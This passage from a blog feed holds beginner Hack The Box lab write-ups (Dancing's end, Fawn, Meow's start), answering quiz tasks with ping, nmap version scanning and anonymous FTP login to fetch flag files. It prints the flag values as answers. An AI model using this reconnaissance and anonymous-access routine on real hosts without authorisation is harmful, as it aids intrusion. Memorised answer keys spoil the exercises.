</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Desktop flag.txt IXFvgbNan my_data Templates worknotes.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>5f61c10dffbc77a704d76016a22f1664</span></span></code></pre></div>
<p>Since we got everything we needed from the share, we can exit out of the SMB server and the files we downloaded are saved inside the location where we ran our <code>smbclient</code> command from.
<br/>
<br/></p>
<h5 id="submit-flag">SUBMIT FLAG</h5>
<p>submit root flag</p>






<pre tabindex="0"><code>5f61c10dffbc77a704d76016a22f1664</code></pre>
<p><img src="./dancing_img.png" alt="dancing_cleared"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Fawn</title>
      <link>http://localhost:1313/htb-fawn/</link>
      <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-fawn/</guid>
      <description>Hopefully one day I will become very good at CTFs.
TASK 1 What does the 3-letter acronym FTP stand for?
File Transfer Protocol TASK 2 Which port does the FTP service listen on usually?
21 TASK 3 What acronym is used for the secure version of FTP?
SFTP Secure File Transfer Protocol. Designed by the Internet Engineering Task Force as an extension of Secure Shell (SSH).
TASK 4 What is the command we can use to send an ICMP echo request to test our connection to the target?</description>
      <content:encoded><![CDATA[<blockquote>
<p>Hopefully one day I will become very good at CTFs.</p>
</blockquote>
<p><img src="./icandoit.gif" alt="i_can_do_it"></p>
<h5 id="task-1">TASK 1</h5>
<p>What does the 3-letter acronym FTP stand for?</p>






<pre tabindex="0"><code>File Transfer Protocol</code></pre>
</br>
<h5 id="task-2">TASK 2</h5>
<p>Which port does the FTP service listen on usually?</p>






<pre tabindex="0"><code>21</code></pre>
</br>
<h5 id="task-3">TASK 3</h5>
<p>What acronym is used for the secure version of FTP?</p>






<pre tabindex="0"><code>SFTP</code></pre>
<p><code>Secure File Transfer Protocol. Designed by the Internet Engineering Task Force as an extension of Secure Shell (SSH).</code></p>
</br>
<h5 id="task-4">TASK 4</h5>
<p>What is the command we can use to send an ICMP echo request to test our connection to the target?</p>






<pre tabindex="0"><code>ping</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ping 10.129.67.107
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>PING 10.129.67.107 <span style="color:#89dceb;font-weight:bold">(</span>10.129.67.107<span style="color:#89dceb;font-weight:bold">)</span> 56<span style="color:#89dceb;font-weight:bold">(</span>84<span style="color:#89dceb;font-weight:bold">)</span> bytes of data.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">64</span> bytes from 10.129.67.107: <span style="color:#f5e0dc">icmp_seq</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">1</span> <span style="color:#f5e0dc">ttl</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">63</span> <span style="color:#f5e0dc">time</span><span style="color:#89dceb;font-weight:bold">=</span>8.68 ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">64</span> bytes from 10.129.67.107: <span style="color:#f5e0dc">icmp_seq</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span> <span style="color:#f5e0dc">ttl</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">63</span> <span style="color:#f5e0dc">time</span><span style="color:#89dceb;font-weight:bold">=</span>8.81 ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">64</span> bytes from 10.129.67.107: <span style="color:#f5e0dc">icmp_seq</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">3</span> <span style="color:#f5e0dc">ttl</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">63</span> <span style="color:#f5e0dc">time</span><span style="color:#89dceb;font-weight:bold">=</span>8.87 ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">64</span> bytes from 10.129.67.107: <span style="color:#f5e0dc">icmp_seq</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">4</span> <span style="color:#f5e0dc">ttl</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">63</span> <span style="color:#f5e0dc">time</span><span style="color:#89dceb;font-weight:bold">=</span>8.68 ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>^C
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>--- 10.129.67.107 ping statistics ---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">4</span> packets transmitted, <span style="color:#fab387">4</span> received, 0% packet loss, <span style="color:#89dceb">time</span> 3006ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>rtt min/avg/max/mdev <span style="color:#89dceb;font-weight:bold">=</span> 8.679/8.760/8.873/0.082 ms
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
</br>
<h5 id="task-5">TASK 5</h5>
<p>From your scans, what version is FTP running on the target?</p>






<pre tabindex="0"><code>vsftpd 3.0.3</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sV 10.129.67.107
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-17 05:49 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.67.107
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.027s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">999</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>21/tcp open ftp vsftpd 3.0.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Unix
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 0.60 seconds
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
</br>
<h5 id="task-6">TASK 6</h5>
<p>From your scans, what OS type is running on the target?</p>






<pre tabindex="0"><code>Unix</code></pre>
</br>
<h5 id="task-7">TASK 7</h5>
<p>What is the command we need to run in order to display the &lsquo;ftp&rsquo; client help menu?</p>






<pre tabindex="0"><code>ftp -h</code></pre>
</br>
<h5 id="task-8">TASK 8</h5>
<p>What is username that is used over FTP when you want to log in without having an account?</p>






<pre tabindex="0"><code>anonymous</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ftp 10.129.67.107
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Connected to 10.129.67.107.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">220</span> <span style="color:#89dceb;font-weight:bold">(</span>vsFTPd 3.0.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.129.67.107:root<span style="color:#89dceb;font-weight:bold">)</span>: anonymous
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">331</span> Please specify the password.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">230</span> Login successful.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>ftp&gt;</span></span></code></pre></div>
</br>
<h5 id="task-9">TASK 9</h5>
<p>What is the response code we get for the FTP message &lsquo;Login successful&rsquo;?</p>






<pre tabindex="0"><code>230</code></pre>
</br>
<h5 id="task-10">TASK 10</h5>
<p>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.</p>






<pre tabindex="0"><code>ls</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ftp 10.129.67.107
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Connected to 10.129.67.107.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">220</span> <span style="color:#89dceb;font-weight:bold">(</span>vsFTPd 3.0.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.129.67.107:root<span style="color:#89dceb;font-weight:bold">)</span>: anonymous
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">331</span> Please specify the password.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">230</span> Login successful.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>ftp&gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#fab387">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rw-r--r-- <span style="color:#fab387">1</span> <span style="color:#fab387">0</span> <span style="color:#fab387">0</span> <span style="color:#fab387">32</span> Jun <span style="color:#fab387">04</span> <span style="color:#fab387">2021</span> flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">226</span> Directory send OK.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>ftp&gt;</span></span></code></pre></div>
</br>
<h5 id="task-11">TASK 11</h5>
<p>What is the command used to download the file we found on the FTP server?</p>






<pre tabindex="0"><code>get</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ftp&gt; get flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>local: flag.txt remote: flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#fab387">200</span> PORT <span style="color:#89dceb">command</span> successful. Consider using PASV.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#fab387">150</span> Opening BINARY mode data connection <span style="color:#cba6f7">for</span> flag.txt <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">32</span> bytes<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#fab387">226</span> Transfer complete.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#fab387">32</span> bytes received in 0.00 secs <span style="color:#89dceb;font-weight:bold">(</span>32.7225 kB/s<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>ftp&gt;</span></span></code></pre></div>
</br>
<h5 id="submit-the-flag">SUBMIT THE FLAG</h5>
<p>Submit root flag</p>






<pre tabindex="0"><code>035db21c881520061c53e0536e44f815</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Desktop flag.txt my_data Templates
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>035db21c881520061c53e0536e44f815
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
<p><img src="./fawn.png" alt="fawn_cleared"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Meow</title>
      <link>http://localhost:1313/htb-meow/</link>
      <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-meow/</guid>
      <description>My journey begins here. 🐌
TASK 1 What does the acronym VM stand for? Virtual Machine TASK 2 What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&amp;rsquo;s also known as a console or shell.
Terminal TASK 3 What service do we use to form our VPN connection into HTB labs?</description>
      <content:encoded><![CDATA[<blockquote>
<p>My journey begins here. 🐌</p>
</blockquote>
<hr>
<h5 id="task-1">TASK 1</h5>
<p>What does the acronym VM stand for? </br></p>






<pre tabindex="0"><code>Virtual Machine</code></pre>
</br>
<h5 id="task-2">TASK 2</h5>
<p>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It&rsquo;s also known as a console or shell.</p>






<pre tabindex="0"><code>Terminal</code></pre>
</br>
<h5 id="task-3">TASK 3</h5>
<p>What service do we use to form our VPN connection into HTB labs?</p>






